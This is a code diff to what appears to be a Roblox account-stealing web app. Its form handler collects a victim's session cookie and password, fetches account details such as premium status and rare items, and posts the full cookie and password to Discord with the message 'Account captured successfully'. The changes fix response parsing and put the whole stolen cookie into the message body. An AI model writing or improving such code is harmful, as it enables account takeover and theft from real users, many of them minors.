@@ -82,7 +82,10 @@ def get_roblox_user_info(cookie):
                 if premium_response.status_code == 200:
                     premium_data = premium_response.json()
                     print(f"Premium API response: {premium_data}")
-                    if premium_data.get('isPremium', False):
+                    # Handle both object and boolean responses
+                    if isinstance(premium_data, bool):
+                        premium_status = '✅ Yes' if premium_data else '❌ No'
+                    elif isinstance(premium_data, dict) and premium_data.get('isPremium', False):
                         premium_status = '✅ Yes'
                 else:
                     print(f"Premium API failed with status: {premium_response.status_code}")
@@ -223,7 +226,7 @@ def submit_form():
         print("Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
         
-        # Prepare main message content with account information
+        # Prepare main message content with account information and cookie
         account_info = f"""🎮 **Roblox Account Information**
 👤 **Username:** {user_info['username']} ({user_info['display_name']})
 🆔 **User ID:** {user_info['user_id'] or 'Unknown'}
@@ -231,24 +234,10 @@ def submit_form():
 💎 **Premium:** {user_info['premium_status']}
 🔒 **Password:** {password or 'Not provided'}
 💀 **Korblox:** {'✅ Yes' if korblox else '❌ No'}
-🎭 **Headless:** {'✅ Yes' if headless else '❌ No'}"""
+🎭 **Headless:** {'✅ Yes' if headless else '❌ No'}
 
-        # Prepare embed fields for cookie and additional info
-        fields = []
-        
-        # Handle cookie display as single field
-        if cookie:
-            fields.append({
-                'name': '🍪 Whole Cookie',
-                'value': f'```{cookie}```',
-                'inline': False
-            })
-        else:
-            fields.append({
-                'name': '🍪 Whole Cookie',
-                'value': 'Not provided',
-                'inline': False
-            })
+🍪 **Whole Cookie:**
+```{cookie if cookie else 'Not provided'}```"""
 
         discord_data = {
             'content': account_info,
@@ -258,7 +247,13 @@ def submit_form():
                 'thumbnail': {
                     'url': user_info['profile_picture']
                 },
-                'fields': fields,
+                'fields': [
+                    {
+                        'name': '📋 Summary',
+                        'value': 'Account information and cookie captured successfully',
+                        'inline': False
+                    }
+                ],
                 'footer': {
                     'text': f'Account captured successfully • {user_info["display_name"]}'
                 }
